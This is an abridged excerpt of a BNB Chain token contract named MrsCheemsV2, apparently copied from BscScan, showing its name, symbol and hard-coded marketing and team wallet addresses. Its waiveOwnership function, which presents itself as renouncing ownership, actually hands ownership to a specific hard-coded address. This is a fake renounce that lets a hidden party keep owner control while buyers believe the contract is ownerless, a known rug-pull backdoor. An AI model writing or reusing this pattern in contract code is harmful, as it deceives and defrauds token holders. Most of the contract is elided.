...
/**
 *Submitted for verification at BscScan.com on 2022-03-5
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xaCC4d4cF67a5A65c8B7229892e7c80A9b8fA9767);
    }
...
contract MrsCheemsV2 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MRSCheemsV2";
    string private _symbol = "MCV2";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xF9b268560cAa88332403b79133FBe202197C6d22);
    address payable public teamWalletAddress = payable(0xF6780F8Ec37833E97624C7B09Fce883e19b04d11);
